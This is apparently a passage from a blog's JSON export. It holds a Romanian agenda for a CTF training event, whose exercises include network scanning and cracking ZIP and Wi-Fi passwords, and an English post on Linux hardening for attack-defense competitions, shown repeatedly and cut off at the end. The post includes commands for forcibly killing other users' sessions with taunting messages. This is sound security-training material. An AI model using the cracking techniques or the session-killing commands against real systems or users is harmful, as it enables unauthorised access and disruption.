cibernetice (inclusiv Microsoft 365 i Azure Cloud)</li>\n<li>Dezvoltare software&#x2F;aplicaii, automatizare de procese&#x2F;RPA i raportare automat&#x2F;BI</li>\n<li>Soluii de inteligen artificial pentru domeniul medical</li>\n</ul>\n<p>n contextul actual, ixodron pune un accent deosebit pe auditul i consultana de securitate, asigurndu-se c organizaiile sunt pregtite s fac fa provocrilor cibernetice moderne.</p>\n<br>\n\n<h3 id=\"Despre-ALEF\"><a href=\"#Despre-ALEF\" class=\"headerlink\" title=\"Despre ALEF\"></a>Despre ALEF</h3><p><a href=\"https://www.alef.com/ro/\" target=\"_\"><strong>ALEF Distribution RO</strong></a> este un distribuitor de soluii, servicii i traininguri IT, adresate att pieei de business, ct i consumatorilor individuali. Cu o echip local de experi i peste 20 de ani de experien n domeniul tehnologiei informaiei, ALEF Distribution RO asigur livrarea de servicii i soluii complete, att cloud, ct i on-premise, care respect cele mai riguroase standarde de calitate i rspund nevoilorclienilor.</p>\n<br>\n\n<h3 id=\"Despre-trainer\"><a href=\"#Despre-trainer\" class=\"headerlink\" title=\"Despre trainer\"></a>Despre trainer</h3><p>Trainer i moderator al evenimentului: <a href=\"https://www.linkedin.com/in/radumarin001/\" target=\"_blank\"><strong>Marin Radu</strong></a>.<br>Marin Radu opereaz n domeniul securitii cibernetice, participnd la competiii naionale i internaionale, conferine i exerciii cyber. De asemenea, are experien n organizarea competiiilor la nivel local i naional.</p>\n<br>\n\n<h2 id=\"Agenda-evenimentului\"><a href=\"#Agenda-evenimentului\" class=\"headerlink\" title=\"Agenda evenimentului\"></a>Agenda evenimentului</h2><h3 id=\"Ziua-1-02-10-2024\"><a href=\"#Ziua-1-02-10-2024\" class=\"headerlink\" title=\"Ziua 1: 02.10.2024\"></a>Ziua 1: 02.10.2024</h3><table>\n  <tr>\n    <th style=\"width:15%\">Interval orar</th>\n    <th style=\"width:85%\">Activitate</th>\n  </tr>\n  <tr>\n    <td>08:30  09:00</td>\n    <td>nregistrare i cafea</td>\n  </tr>\n  <tr>\n    <td>09:00  09:30</td>\n    <td>Prezentarea agendei & intro</td>\n  </tr>\n  <tr>\n    <td>09:30  11:00</td>\n    <td>\n      Primul set de exerciii:<br>\n        &nbsp;&nbsp;&nbsp;&nbspParticipanii, mpreun cu trainerul, vor explora introducerea n cybersecurity i virtualizare, <br>\n        &nbsp;&nbsp;&nbsp;&nbspscanarea reelei interne a mainii virtuale i conectarea la serverele FTP, SMB i SSH.\n      </ul>\n    </td>\n  </tr>\n  <tr>\n    <td>11:00  11:30</td>\n    <td>Q&A</td>\n  </tr>\n  <tr>\n    <td>11:30  13:00</td>\n    <td>Pauza de prnz</td>\n  </tr>\n  <tr>\n    <td>13:00  15:30</td>\n    <td>\n      Al doilea set de exerciii:<br>\n      &nbsp;&nbsp;&nbsp;&nbspmpreun cu participanii, se vor testa servere Web i<br>\n      &nbsp;&nbsp;&nbsp;&nbspse vor sparge parolele unor arhive protejate i ale unor reele Wi-Fi.\n      </ul>\n    </td>\n  </tr>\n  <tr>\n    <td>15:30  16:00</td>\n    <td>Q&A</td>\n  </tr>\n  <tr>\n    <td>16:00  16:30</td>\n    <td>Pauz</td>\n  </tr>\n  <tr>\n    <td>16:30  18:00</td>\n    <td>\n      Prezentarea infrastructurii CTF:\n      <ul>\n        <li>Conectare i nregistrare pe platforma CTF</li>\n        <li>Modul de rezolvare a exerciiilor</li>\n        <li>Aspecte importante pe platform</li>\n        <li>Modul de punctare al rezolvrilor</li>\n        <li>Resursele de nvare disponibile</li>\n      </ul>\n    </td>\n  </tr>\n</table>\n\n<h3 id=\"Ziua-2-03-10-2024\"><a href=\"#Ziua-2-03-10-2024\" class=\"headerlink\" title=\"Ziua 2: 03.10.2024\"></a>Ziua 2: 03.10.2024</h3><table>\n  <tr>\n    <th style=\"width:15%\">Interval orar</th>\n    <th style=\"width:85%\">Activitate</th>\n  </tr>\n  <tr>\n    <td>08:30  09:00</td>\n    <td>Primirea participanilor i cafea</td>\n  </tr>\n  <tr>\n    <td>09:00  09:30</td>\n    <td>\n      Recapitularea exerciiilor i pregtirile finale pentru CTF:\n      <ul>\n        <li>Asigurarea conexiunii la internet a participanilor</li>\n        <li>Verificarea integritii</li>\n        <li>Conectare la CTF</li>\n        <li>Recapitularea regulilor i instruciunilor</li>\n      </ul>\n    </td>\n  </tr>\n  <tr>\n    <td>09:30  12:30</td>\n    <td>\n      CTF - prima parte:\n      <ul>\n        <li>nceperea competiiei</li>\n        <li>Monitorizarea participanilor i experiena acestora</li>\n      </ul>\n    </td>\n  </tr>\n  <tr>\n    <td>12:30  13:30</td>\n    <td>Pauza de prnz</td>\n  </tr>\n  <tr>\n    <td>14:00  16:00</td>\n    <td>\n      CTF - a doua parte:\n      <ul>\n        <li>Adugarea exerciiilor rmase</li>\n        <li>Adugarea indiciilor necesare</li>\n      </ul>\n    </td>\n  </tr>\n  <tr>\n    <td>16:00  16:30</td>\n    <td>Pauz</td>\n  </tr>\n  <tr>\n    <td>16:30  17:30</td>\n    <td>Explicarea exerciiilor i rezolvrilor</td>\n  </tr>\n  <tr>\n    <td>17:30  18:00</td>\n    <td>Desemnarea echipelor ctigtoare</td>\n  </tr>\n</table>\n\n\n<br>\n\n<h2 id=\"Activitatile-planificate\"><a href=\"#Activitatile-planificate\" class=\"headerlink\" title=\"Activitile planificate\"></a>Activitile planificate</h2><p><strong>Demo-uri i taskuri introductive:</strong></p>\n<ul>\n<li><code>(1)</code> <a href=\"https://chronossec.site/CTFs/ixodron/Demo/1/#1-Scanarea-retelei\" target=\"_blank\"><strong>scanarea unei reele</strong></a></li>\n<li><code>(1)</code> <a href=\"https://chronossec.site/CTFs/ixodron/Demo/1/#2-Server-FTP\" target=\"_blank\"><strong>conectarea la un server FTP</strong></a></li>\n<li><code>(1)</code> <a href=\"https://chronossec.site/CTFs/ixodron/Demo/1/#3-Server-SMB\" target=\"_blank\"><strong>conectarea la un server SMB</strong></a></li>\n<li><code>(1)</code> <a href=\"https://chronossec.site/CTFs/ixodron/Demo/1/#4-Server-SSH\" target=\"_blank\"><strong>conectarea la un server SSH</strong></a></li>\n<li><code>(2)</code> <a href=\"https://chronossec.site/CTFs/ixodron/Demo/2/#1-Server-web\" target=\"_blank\"><strong>testarea unui server web</strong></a></li>\n<li><code>(2)</code> <a href=\"https://chronossec.site/CTFs/ixodron/Demo/2/#2-Parole-personalizate\" target=\"_blank\"><strong>crearea unor liste personalizate de parole</strong></a></li>\n<li><code>(2)</code> <a href=\"https://chronossec.site/CTFs/ixodron/Demo/2/#3-Arhiva-ZIP\" target=\"_blank\"><strong>spargerea parolei unei arhive protejate</strong></a></li>\n<li><code>(2)</code> <a href=\"https://chronossec.site/CTFs/ixodron/Demo/2/#4-Wi-Fi\" target=\"_blank\"><strong>spargerea parolei unei reele Wi-Fi</strong></a></li>\n</ul>\n<br>\n\n<h2 id=\"Extra\"><a href=\"#Extra\" class=\"headerlink\" title=\"Extra\"></a>Extra</h2><p><strong>Resurse de nvare:</strong></p>\n<ul>\n<li><a href=\"https://play.picoctf.org/practice\" target=\"_blank\"><strong><code>PicoCTF</code></strong></a></li>\n<li><a href=\"https://tryhackme.com/hacktivities?tab=search\" target=\"_blank\"><strong><code>TryHackMe</code></strong></a></li>\n<li><a href=\"https://247ctf.com/dashboard\" target=\"_blank\"><strong><code>247CTF</code></strong></a></li>\n<li><a href=\"https://ctflearn.com/challenge/1/browse\" target=\"_blank\"><strong><code>CTFLearn</code></strong></a></li>\n<li><a href=\"https://chronos-security.notion.site/Learning-resources-652c504eb73b46daa5fa5a79be840624?pvs=4\" target=\"_blank\"><strong><code>Chronos Secrurity</code></strong></a></li>\n</ul>\n<br>\n<br>\n\n<p style=\"text-align:center\">\n  <b>NEXT</b>: <a href=\"/CTFs/ixodron/Demo/1/\" target=\"_blank\">Demo 1</a>\n</p>\n\n<hr>\n<hr>"},{"title":"Defense techniques","toc":true,"_content":"\n---\nDefense techniques used in Attack - Defense CTF competitions, also known Red team - Blue team.\nApplicable in KOTH (King of the Hill) and _partly_ in real life.\n\n---\n<!-- more -->\n\n<br>\n\n## Protection systems\nInstall security updates\n```bash\nsudo apt-get update\nsudo apt-get upgrade\n```\nEnable auditing with `auditd`\n```bash\nsudo apt-get install auditd\nsudo systemctl enable auditd\n```\nUse Logwatch (or Logcheck) to monitor log files for suspicious activity\n```bash logwatch - install and configure\nsudo apt-get install logwatch\nsudo nano /usr/share/logwatch/default.conf/logwatch.con\n```\n```bash logwatch - monitor SSH login attempts\nLogFile = /var/log/auth.log\n*Remove = root\n*Remove = backup\n*Remove = mail\n*OnlyHosts = 192.168.1.0/24\n*ApplyhttpDate\n*ApplyStdDate\n*Apply = /usr/share/logwatch/scripts/shared/apply-uudecode\n*Apply = /usr/share/logwatch/scripts/shared/apply-mailto\n*NoDetail = /etc/logwatch/conf/logwatch.conf\n```\n```bash logwatch - run and generate a report\nsudo logwatch\n```\nUse a file integrity monitoring tool\n```bash tripwire\nsudo apt-get install tripwire\nsudo tripwire --init    # initialize the tripwire database\nsudo tripwire --check   # check for changes\n```\nUse an IDS/IPS\n```bash snort\nsudo apt-get install snort\nsudo systemctl start snort\nsudo tail -f /var/log/snort/alert\n```\n\n<br>\n\n## Firewall\nConfigure `iptables`\n```bash\nsudo iptables -A INPUT -p tcp --dport 22222 -j ACCEPT  # Allows SSH traffic - change SSH port below\nsudo iptables -A INPUT -m conntrack --ctstate ESTABLISHED,RELATED -j ACCEPT # Allows established connections\nsudo iptables -A INPUT -j DROP # Deny all other traffic\n```\n\n<br>\n\n## SSH\nImprove SSH security\n```bash modify SSH config\nsudo nano /etc/ssh/sshd_config\n```\n```bash uncomment or modify the following lines\nPort 22222\nPasswordAuthentication no\nChallengeResponseAuthentication no\nPubkeyAuthentication yes\nPermitRootLogin no\n```\n```bash\nsudo systemctl restart sshd\n```\n\nView SSH logs\n```bash\nsudo journalctl -u ssh\n```\n\nAccept only private key authentication\n```bash locally - generate and send public key\nssh-keygen -t rsa\nssh-copy-id -i ~/.ssh/id_rsa.pub user@target_ip\n```\n```bash remote - uncomment lines in \"/etc/ssh/sshd_config\"\nPasswordAuthentication no\nChallengeResponseAuthentication no\n```\n\nSet up Fail2ban\n```bash\nsudo apt-get install fail2ban\nnano /etc/fail2ban/jail.local\n```\n```conf /etc/fail2ban/jail.local\n[sshd]\nenabled = true\nport = 22222\nfilter = sshd\nlogpath = /var/log/auth.log\nmaxretry = 3\nbantime = 86400\n```\n\n<br>\n\n## System config\nDisable unused network protocols\n```bash\nsudo nano /etc/sysctl.conf\n```\n```conf /etc/sysctl.conf\nnet.ipv6.conf.all.disable_ipv6 = 1\nnet.ipv6.conf.default.disable_ipv6 = 1\n```\nDisable unnecessary services\n```bash\nsystemctl list-unit-files --state=enabled\nsudo systemctl disable $service_name\n```\n\n<br>\n\n## Users\n\nPrevent users from seeing processes that do not belong to them\n```bash\nsudo mount -o remount,rw,hidepid=2 /proc\n```\n```bash create a group of users that bypass this restriction\nproc /proc proc defaults,hidepid=2,gid=admin 0 0 \n```\n\nKick a user off your machine\n```bash first method\n# replace $user\n# replace $tty with terminal name in `who` output (ex. `pts/2`) \necho \"Goodbye, kiddo!\" | write $user $tty && sleep 10 && killall -u $user -HUP\n```\n```bash second method\n# view who is logged in and the tty pid\nwho -u\n# mock them before you kick them out\n(echo \"And now... you are gone\" | write $user $tty) && sleep 10\n# kill the tty pid\nkill -9 $pid\n```\n\nRemove ability to view output for commands\n```bash\nexec >/dev/null\n```\n```bash enable output\nexec >/dev/tty\n```\n\n<br>\n\n## Files\nView recently modified files\n```bash created or modified in the last 5 days\nfind / -mtime -5 -o -ctime -5 2>/dev/null\n```\n\n<br>\n\n---\n---","source":"_posts/Pentesting/Attack-defense/index.md","raw":"---\ntitle: Defense techniques\ncategories:\n  - Pentesting\n  - Attack-Defense\ntags:\n  - Pentesting\n  - Attack-Defense\ntoc: true\n---\n\n---\nDefense techniques used in Attack - Defense CTF competitions, also known Red team - Blue team.\nApplicable in KOTH (King of the Hill) and _partly_ in real life.\n\n---\n<!-- more -->\n\n<br>\n\n## Protection systems\nInstall security updates\n```bash\nsudo apt-get update\nsudo apt-get upgrade\n```\nEnable auditing with `auditd`\n```bash\nsudo apt-get install auditd\nsudo systemctl enable auditd\n```\nUse Logwatch (or Logcheck) to monitor log files for suspicious activity\n```bash logwatch - install and configure\nsudo apt-get install logwatch\nsudo nano /usr/share/logwatch/default.conf/logwatch.con\n```\n```bash logwatch - monitor SSH login attempts\nLogFile = /var/log/auth.log\n*Remove = root\n*Remove = backup\n*Remove = mail\n*OnlyHosts = 192.168.1.0/24\n*ApplyhttpDate\n*ApplyStdDate\n*Apply = /usr/share/logwatch/scripts/shared/apply-uudecode\n*Apply = /usr/share/logwatch/scripts/shared/apply-mailto\n*NoDetail = /etc/logwatch/conf/logwatch.conf\n```\n```bash logwatch - run and generate a report\nsudo logwatch\n```\nUse a file integrity monitoring tool\n```bash tripwire\nsudo apt-get install tripwire\nsudo tripwire --init    # initialize the tripwire database\nsudo tripwire --check   # check for changes\n```\nUse an IDS/IPS\n```bash snort\nsudo apt-get install snort\nsudo systemctl start snort\nsudo tail -f /var/log/snort/alert\n```\n\n<br>\n\n## Firewall\nConfigure `iptables`\n```bash\nsudo iptables -A INPUT -p tcp --dport 22222 -j ACCEPT  # Allows SSH traffic - change SSH port below\nsudo iptables -A INPUT -m conntrack --ctstate ESTABLISHED,RELATED -j ACCEPT # Allows established connections\nsudo iptables -A INPUT -j DROP # Deny all other traffic\n```\n\n<br>\n\n## SSH\nImprove SSH security\n```bash modify SSH config\nsudo nano /etc/ssh/sshd_config\n```\n```bash uncomment or modify the following lines\nPort 22222\nPasswordAuthentication no\nChallengeResponseAuthentication no\nPubkeyAuthentication yes\nPermitRootLogin no\n```\n```bash\nsudo systemctl restart sshd\n```\n\nView SSH logs\n```bash\nsudo journalctl -u ssh\n```\n\nAccept only private key authentication\n```bash locally - generate and send public key\nssh-keygen -t rsa\nssh-copy-id -i ~/.ssh/id_rsa.pub user@target_ip\n```\n```bash remote - uncomment lines in \"/etc/ssh/sshd_config\"\nPasswordAuthentication no\nChallengeResponseAuthentication no\n```\n\nSet up Fail2ban\n```bash\nsudo apt-get install fail2ban\nnano /etc/fail2ban/jail.local\n```\n```conf /etc/fail2ban/jail.local\n[sshd]\nenabled = true\nport = 22222\nfilter = sshd\nlogpath = /var/log/auth.log\nmaxretry = 3\nbantime = 86400\n```\n\n<br>\n\n## System config\nDisable unused network protocols\n```bash\nsudo nano /etc/sysctl.conf\n```\n```conf /etc/sysctl.conf\nnet.ipv6.conf.all.disable_ipv6 = 1\nnet.ipv6.conf.default.disable_ipv6 = 1\n```\nDisable unnecessary services\n```bash\nsystemctl list-unit-files --state=enabled\nsudo systemctl disable $service_name\n```\n\n<br>\n\n## Users\n\nPrevent users from seeing processes that do not belong to them\n```bash\nsudo mount -o remount,rw,hidepid=2 /proc\n```\n```bash create a group of users that bypass this restriction\nproc /proc proc defaults,hidepid=2,gid=admin 0 0 \n```\n\nKick a user off your machine\n```bash first method\n# replace $user\n# replace $tty with terminal name in `who` output (ex. `pts/2`) \necho \"Goodbye, kiddo!\" | write $user $tty && sleep 10 && killall -u $user -HUP\n```\n```bash second method\n# view who is logged in and the tty pid\nwho -u\n# mock them before you kick them out\n(echo \"And now... you are gone\" | write $user $tty) && sleep 10\n# kill the tty pid\nkill -9 $pid\n```\n\nRemove ability to view output for commands\n```bash\nexec >/dev/null\n```\n```bash enable output\nexec >/dev/tty\n```\n\n<br>\n\n## Files\nView recently modified files\n```bash created or modified in the last 5 days\nfind / -mtime -5 -o -ctime -5 2>/dev/null\n```\n\n<br>\n\n---\n---","slug":"Pentesting/Attack-defense/index","published":1,"date":"2024-09-23T06:18:55.852Z","updated":"2024-09-23T06:18:55.852Z","comments":1,"layout":"post","photos":[],"_id":"cm1emkmhx000w6gvg8ie4gjxz","content":"<hr>\n<p>Defense techniques used in Attack - Defense CTF competitions, also known Red team - Blue team.<br>Applicable in KOTH (King of the Hill) and <em>partly</em> in real life.</p>\n<hr>\n<span id=\"more\"></span>\n\n<br>\n\n<h2 id=\"Protection-systems\"><a href=\"#Protection-systems\" class=\"headerlink\" title=\"Protection systems\"></a>Protection systems</h2><p>Install security updates</p>\n<pre><code class=\"highlight bash\"><span class=\"built_in\">sudo</span> apt-get update\n<span class=\"built_in\">sudo</span> apt-get upgrade</code></pre>\n<p>Enable auditing with <code>auditd</code></p>\n<pre><code class=\"highlight bash\"><span class=\"built_in\">sudo</span> apt-get install auditd\n<span class=\"built_in\">sudo</span> systemctl <span class=\"built_in\">enable</span> auditd</code></pre>\n<p>Use Logwatch (or Logcheck) to monitor log files for suspicious activity</p>\n<pre><div class=\"caption\"><span>logwatch - install and configure</span></div><code class=\"highlight bash\"><span class=\"built_in\">sudo</span> apt-get install logwatch\n<span class=\"built_in\">sudo</span> nano /usr/share/logwatch/default.conf/logwatch.con</code></pre>\n<pre><div class=\"caption\"><span>logwatch - monitor SSH login attempts</span></div><code class=\"highlight bash\">LogFile = /var/log/auth.log\n*Remove = root\n*Remove = backup\n*Remove = mail\n*OnlyHosts = 192.168.1.0/24\n*ApplyhttpDate\n*ApplyStdDate\n*Apply = /usr/share/logwatch/scripts/shared/apply-uudecode\n*Apply = /usr/share/logwatch/scripts/shared/apply-mailto\n*NoDetail = /etc/logwatch/conf/logwatch.conf</code></pre>\n<pre><div class=\"caption\"><span>logwatch - run and generate a report</span></div><code class=\"highlight bash\"><span class=\"built_in\">sudo</span> logwatch</code></pre>\n<p>Use a file integrity monitoring tool</p>\n<pre><div class=\"caption\"><span>tripwire</span></div><code class=\"highlight bash\"><span class=\"built_in\">sudo</span> apt-get install tripwire\n<span class=\"built_in\">sudo</span> tripwire --init    <span class=\"comment\"># initialize the tripwire database</span>\n<span class=\"built_in\">sudo</span> tripwire --check   <span class=\"comment\"># check for changes</span></code></pre>\n<p>Use an IDS&#x2F;IPS</p>\n<pre><div class=\"caption\"><span>snort</span></div><code class=\"highlight bash\"><span class=\"built_in\">sudo</span> apt-get install snort\n<span class=\"built_in\">sudo</span> systemctl start snort\n<span class=\"built_in\">sudo</span> <span class=\"built_in\">tail</span> -f /var/log/snort/alert</code></pre>\n\n<br>\n\n<h2 id=\"Firewall\"><a href=\"#Firewall\" class=\"headerlink\" title=\"Firewall\"></a>Firewall</h2><p>Configure <code>iptables</code></p>\n<pre><code class=\"highlight bash\"><span class=\"built_in\">sudo</span> iptables -A INPUT -p tcp --dport 22222 -j ACCEPT  <span class=\"comment\"># Allows SSH traffic - change SSH port below</span>\n<span class=\"built_in\">sudo</span> iptables -A INPUT -m conntrack --ctstate ESTABLISHED,RELATED -j ACCEPT <span class=\"comment\"># Allows established connections</span>\n<span class=\"built_in\">sudo</span> iptables -A INPUT -j DROP <span class=\"comment\"># Deny all other traffic</span></code></pre>\n\n<br>\n\n<h2 id=\"SSH\"><a href=\"#SSH\" class=\"headerlink\" title=\"SSH\"></a>SSH</h2><p>Improve SSH security</p>\n<pre><div class=\"caption\"><span>modify SSH config</span></div><code class=\"highlight bash\"><span class=\"built_in\">sudo</span> nano /etc/ssh/sshd_config</code></pre>\n<pre><div class=\"caption\"><span>uncomment or modify the following lines</span></div><code class=\"highlight bash\">Port 22222\nPasswordAuthentication no\nChallengeResponseAuthentication no\nPubkeyAuthentication <span class=\"built_in\">yes</span>\nPermitRootLogin no</code></pre>\n<pre><code class=\"highlight bash\"><span class=\"built_in\">sudo</span> systemctl restart sshd</code></pre>\n\n<p>View SSH logs</p>\n<pre><code class=\"highlight bash\"><span class=\"built_in\">sudo</span> journalctl -u ssh</code></pre>\n\n<p>Accept only private key authentication</p>\n<pre><div class=\"caption\"><span>locally - generate and send public key</span></div><code class=\"highlight bash\">ssh-keygen -t rsa\nssh-copy-id -i ~/.ssh/id_rsa.pub user@target_ip</code></pre>\n<pre><div class=\"caption\"><span>remote - uncomment lines in \"/etc/ssh/sshd_config\"</span></div><code class=\"highlight bash\">PasswordAuthentication no\nChallengeResponseAuthentication no</code></pre>\n\n<p>Set up Fail2ban</p>\n<pre><code class=\"highlight bash\"><span class=\"built_in\">sudo</span> apt-get install fail2ban\nnano /etc/fail2ban/jail.local</code></pre>\n<pre><div class=\"caption\"><span>/etc/fail2ban/jail.local</span></div><code class=\"highlight conf\">[sshd]\nenabled = true\nport = 22222\nfilter = sshd\nlogpath = /var/log/auth.log\nmaxretry = 3\nbantime = 86400</code></pre>\n\n<br>\n\n<h2 id=\"System-config\"><a href=\"#System-config\" class=\"headerlink\" title=\"System config\"></a>System config</h2><p>Disable unused network protocols</p>\n<pre><code class=\"highlight bash\"><span class=\"built_in\">sudo</span> nano /etc/sysctl.conf</code></pre>\n<pre><div class=\"caption\"><span>/etc/sysctl.conf</span></div><code class=\"highlight conf\">net.ipv6.conf.all.disable_ipv6 = 1\nnet.ipv6.conf.default.disable_ipv6 = 1</code></pre>\n<p>Disable unnecessary services</p>\n<pre><code class=\"highlight bash\">systemctl list-unit-files --state=enabled\n<span class=\"built_in\">sudo</span> systemctl <span class=\"built_in\">disable</span> <span class=\"variable\">$service_name</span></code></pre>\n\n<br>\n\n<h2 id=\"Users\"><a href=\"#Users\" class=\"headerlink\" title=\"Users\"></a>Users</h2><p>Prevent users from seeing processes that do not belong to them</p>\n<pre><code class=\"highlight bash\"><span class=\"built_in\">sudo</span> mount -o remount,rw,hidepid=2 /proc</code></pre>\n<pre><div class=\"caption\"><span>create a group of users that bypass this restriction</span></div><code class=\"highlight bash\">proc /proc proc defaults,hidepid=2,gid=admin 0 0</code></pre>\n\n<p>Kick a user off your machine</p>\n<pre><div class=\"caption\"><span>first method</span></div><code class=\"highlight bash\"><span class=\"comment\"># replace $user</span>\n<span class=\"comment\"># replace $tty with terminal name in `who` output (ex. `pts/2`) </span>\n<span class=\"built_in\">echo</span> <span class=\"string\">&quot;Goodbye, kiddo!&quot;</span> | write <span class=\"variable\">$user</span> <span class=\"variable\">$tty</span> &amp;&amp; <span class=\"built_in\">sleep</span> 10 &amp;&amp; killall -u <span class=\"variable\">$user</span> -HUP</code></pre>\n<pre><div class=\"caption\"><span>second method</span></div><code class=\"highlight bash\"><span class=\"comment\"># view who is logged in and the tty pid</span>\n<span class=\"built_in\">who</span> -u\n<span class=\"comment\"># mock them before you kick them out</span>\n(<span class=\"built_in\">echo</span> <span class=\"string\">&quot;And now... you are gone&quot;</span> | write <span class=\"variable\">$user</span> <span class=\"variable\">$tty</span>) &amp;&amp; <span class=\"built_in\">sleep</span> 10\n<span class=\"comment\"># kill the tty pid</span>\n<span class=\"built_in\">kill</span> -9 <span class=\"variable\">$pid</span></code></pre>\n\n<p>Remove ability to view output for commands</p>\n<pre><code class=\"highlight bash\"><span class=\"built_in\">exec</span> &gt;/dev/null</code></pre>\n<pre><div class=\"caption\"><span>enable output</span></div><code class=\"highlight bash\"><span class=\"built_in\">exec</span> &gt;/dev/tty</code></pre>\n\n<br>\n\n<h2 id=\"Files\"><a href=\"#Files\" class=\"headerlink\" title=\"Files\"></a>Files</h2><p>View recently modified files</p>\n<pre><div class=\"caption\"><span>created or modified in the last 5 days</span></div><code class=\"highlight bash\">find / -mtime -5 -o -ctime -5 2&gt;/dev/null</code></pre>\n\n<br>\n\n<hr>\n<hr>\n","excerpt":"<hr>\n<p>Defense techniques used in Attack - Defense CTF competitions, also known Red team - Blue team.<br>Applicable in KOTH (King of the Hill) and <em>partly</em> in real life.</p>\n<hr>","more":"<br>\n\n<h2 id=\"Protection-systems\"><a href=\"#Protection-systems\" class=\"headerlink\" title=\"Protection systems\"></a>Protection systems</h2><p>Install security updates</p>\n<pre><code class=\"highlight bash\"><span class=\"built_in\">sudo</span> apt-get update\n<span class=\"built_in\">sudo</span> apt-get upgrade</code></pre>\n<p>Enable auditing with <code>auditd</code></p>\n<pre><code class=\"highlight bash\"><span class=\"built_in\">sudo</span> apt-get install auditd\n<span class=\"built_in\">sudo</span> systemctl <span class=\"built_in\">enable</span> auditd</code></pre>\n<p>Use Logwatch (or Logcheck) to monitor log files for suspicious activity</p>\n<pre><div class=\"caption\"><span>logwatch - install and configure</span></div><code class=\"highlight bash\"><span class=\"built_in\">sudo</span> apt-get install logwatch\n<span class=\"built_in\">sudo</span> nano /usr/share/logwatch/default.conf/logwatch.con</code></pre>\n<pre><div class=\"caption\"><span>logwatch - monitor SSH login attempts</span></div><code class=\"highlight bash\">LogFile = /var/log/auth.log\n*Remove = root\n*Remove = backup\n*Remove = mail\n*OnlyHosts = 192.168.1.0/24\n*ApplyhttpDate\n*ApplyStdDate\n*Apply = /usr/share/logwatch/scripts/shared/apply-uudecode\n*Apply = /usr/share/logwatch/scripts/shared/apply-mailto\n*NoDetail = /etc/logwatch/conf/logwatch.conf</code></pre>\n<pre><div class=\"caption\"><span>logwatch - run and generate a report</span></div><code class=\"highlight bash\"><span class=\"built_in\">sudo</span> logwatch</code></pre>\n<p>Use a file integrity monitoring tool</p>\n<pre><div class=\"caption\"><span>tripwire</span></div><code class=\"highlight bash\"><span class=\"built_in\">sudo</span> apt-get install tripwire\n<span class=\"built_in\">sudo</span> tripwire --init    <span class=\"comment\"># initialize the tripwire database</span>\n<span class=\"built_in\">sudo</span> tripwire --check   <span class=\"comment\"># check for changes</span></code></pre>\n<p>Use an IDS&#x2F;IPS</p>\n<pre><div class=\"caption\"><span>snort</span></div><code class=\"highlight bash\"><span class=\"built_in\">sudo</span> apt-get install snort\n<span class=\"built_in\">sudo</span> systemctl start snort\n<span class=\"built_in\">sudo</span> <span class=\"built_in\">tail</span> -f /var/log/snort/alert</code></pre>\n\n<br>\n\n<h2 id=\"Firewall\"><a href=\"#Firewall\" class=\"headerlink\" title=\"Firewall\"></a>Firewall</h2><p>Configure <code>iptables</code></p>\n<pre><code class=\"highlight bash\"><span class=\"built_in\">sudo</span> iptables -A INPUT -p tcp --dport 22222 -j ACCEPT  <span class=\"comment\"># Allows SSH traffic - change SSH port below</span>\n<span class=\"built_in\">sudo</span> iptables -A INPUT -m conntrack --ctstate ESTABLISHED,RELATED -j ACCEPT <span class=\"comment\"># Allows established connections</span>\n<span class=\"built_in\">sudo</span> iptables -A INPUT -j DROP <span class=\"comment\"># Deny all other traffic</span></code></pre>\n\n<br>\n\n<h2 id=\"SSH\"><a href=\"#SSH\" class=\"headerlink\" title=\"SSH\"></a>SSH</h2><p>Improve SSH security</p>\n<pre><div class=\"caption\"><span>modify SSH config</span></div><code class=\"highlight bash\"><span class=\"built_in\">sudo</span> nano /etc/ssh/sshd_config</code></pre>\n<pre><div class=\"caption\"><span>uncomment or modify the following lines</span></div><code class=\"highlight bash\">Port 22222\nPasswordAuthentication no\nChallengeResponseAuthentication no\nPubkeyAuthentication <span class=\"built_in\">yes</span>\nPermitRootLogin no</code></pre>\n<pre><code class=\"highlight bash\"><span class=\"built_in\">sudo</span> systemctl restart sshd</code></pre>\n\n<p>View SSH logs</p>\n<pre><code class=\"highlight bash\"><span class=\"built_in\">sudo</span> journalctl -u ssh</code></pre>\n\n<p>Accept only private key authentication</p>\n<pre><div class=\"caption\"><span>locally - generate and send public key</span></div><code class=\"highlight bash\">ssh-keygen -t rsa\nssh-copy-id -i ~/.ssh/id_rsa.pub user@target_ip</code></pre>\n<pre><div class=\"caption\"><span>remote - uncomment lines in \"/etc/ssh/sshd_config\"</span></div><code class=\"highlight bash\">PasswordAuthentication no\nChallengeResponseAuthentication no</code></pre>\n\n<p>Set up Fail2ban</p>\n<pre><code class=\"highlight bash\"><span class=\"built_in\">sudo</span> apt-get install fail2ban\nnano /etc/fail2ban/jail.local</code></pre>\n<pre><div class=\"caption\"><span>/etc/fail2ban/jail.local</span></div><code class=\"highlight conf\">[sshd]\nenabled = true\nport = 22222\nfilter = sshd\nlogpath = /var/log/auth.log\nmaxretry = 3\nbantime = 86400</code></pre>\n\n<br>\n\n<h2 id=\"System-config\"><a href=\"#System-config\" class=\"headerlink\" title=\"System config\"></a>System config</h2><p>Disable unused network protocols</p>\n<pre><code class=\"highlight bash\"><span class=\"built_in\">sudo</span> nano /etc/sysctl.conf</code></pre>\n<pre><div class=\"caption\"><span>/etc/sysctl.conf</span></div><code class=\"highlight conf\">net.ipv6.conf.all.disable_ipv6 = 1\nnet.ipv6.conf.default.disable_ipv6 = 1</code></pre>\n<p>Disable unnecessary services</p>\n<pre><code class=\"highlight bash\">systemctl list-unit-files --state=enabled\n<span class=\"built_in\">sudo</span> systemctl <span class=\"built_in\">disable</span> <span class=\"variable\">$service_name</span></code></pre>\n\n<br>\n\n<h2 id=\"Users\"><a href=\"#Users\" class=\"headerlink\" title=\"Users\"></a>Users</h2><p>Prevent users from seeing processes that do not belong to them</p>\n<pre><code class=\"highlight bash\"><span class=\"built_in\">sudo</span> mount -o remount,rw,hidepid=2 /proc</code></pre>\n<pre><div class=\"caption\"><span>create a group of users that bypass this restriction</span></div><code class=\"highlight bash\">proc /proc proc defaults,hidepid=2,gid=admin 0 0</code></pre>\n\n<p>Kick a user off your machine</p>\n<pre><div class=\"caption\"><span>first method</span></div><code class=\"highlight bash\"><span class=\"comment\"># replace $user</span>\n<span class=\"comment\"># replace $tty with terminal name in `who` output (ex. `pts/2`) </span>\n<span class=\"built_in\">echo</span> <span class=\"string\">&quot;Goodbye, kiddo!&quot;</span> | write <span class=\"variable\">$user</span> <span class=\"variable\">$tty</span> &amp;&amp; <span class=\"built_in\">sleep</span> 10 &amp;&amp; killall -u <span class=\"variable\">$user</span> -HUP</code></pre>\n<pre><div class=\"caption\"><span>second method</span></div><code class=\"highlight bash\"><span class=\"comment\"># view who is logged in and the tty pid</span>\n<span class=\"built_in\">who</span> 